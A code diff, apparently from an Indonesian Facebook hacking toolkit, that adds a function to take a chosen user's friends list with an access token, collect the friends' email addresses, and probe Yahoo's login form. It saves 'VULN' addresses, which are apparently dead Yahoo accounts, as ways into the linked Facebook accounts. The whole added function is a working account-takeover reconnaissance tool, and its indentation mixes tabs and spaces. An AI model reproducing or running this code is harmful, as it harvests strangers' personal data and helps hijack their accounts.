@@ -824,9 +824,9 @@ def menu_yahoo():
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Dari teman facebook'
-    print '\x1b[1;37;40m2. Gunakan File'
+    print '\x1b[1;37;40m2. Clone Teman dari Teman'
+    print '\x1b[1;37;40m3. Gunakan File'
     print '\x1b[1;31;40m0. Kembali'
-    print
     yahoo_pilih()
 
 
@@ -839,14 +839,17 @@ def yahoo_pilih():
         if go == '1':
             yahoofriends()
         else:
-            if go == '2':
-                yahoolist()
-            else:
-                if go == '0':
-                    menu_hack()
-                else:
-                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak ada'
-                    yahoo_pilih()
+			if go == '2':
+				yahoofromfriends()
+			else:
+				if go == '3':
+					yahoolist()
+				else:
+					if go == '0':
+						menu_hack()
+					else:
+						print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mTidak ada'
+						yahoo_pilih()
 
 
 def yahoofriends():
@@ -907,6 +910,81 @@ def yahoofriends():
 
     print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
     print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
+    save.close()
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    menu_yahoo()
+
+
+def yahoofromfriends():
+    global toket
+    os.system('reset')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ada'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            os.mkdir('out')
+        except OSError:
+            pass
+
+        os.system('reset')
+        print logo
+        mpsh = []
+        jml = 0
+        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
+        try:
+            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+            op = json.loads(jok.text)
+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDari\x1b[1;91m :\x1b[1;97m ' + op['name']
+        except KeyError:
+            print '\x1b[1;91m[!] Teman tidak ada'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_yahoo()
+
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMengambil email dari teman \x1b[1;97m...')
+    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+    kimak = json.loads(teman.text)
+    save = open('MailVuln.txt', 'w')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
+    print 42 * '\x1b[1;97m\xe2\x95\x90'
+    for w in kimak['data']:
+        jml += 1
+        mpsh.append(jml)
+        id = w['id']
+        nama = w['name']
+        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
+        z = json.loads(links.text)
+        try:
+            mail = z['email']
+            yahoo = re.compile('@.*')
+            otw = yahoo.search(mail).group()
+            if 'yahoo.com' in otw:
+                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+                br._factory.is_html = True
+                br.select_form(nr=0)
+                br['username'] = mail
+                klik = br.submit().read()
+                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+                try:
+                    pek = jok.search(klik).group()
+                except:
+                    continue
+
+                if '"messages.ERROR_INVALID_USERNAME">' in pek:
+                    save.write(mail + '\n')
+                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
+                    berhasil.append(mail)
+        except KeyError:
+            pass
+
+    print 42 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesai \x1b[1;97m....'
+    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
+    print '\x1b[1;91m[+] \x1b[1;92mTersimpan \x1b[1;91m:\x1b[1;97m MailVuln.txt'
     save.close()
     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
     menu_yahoo()
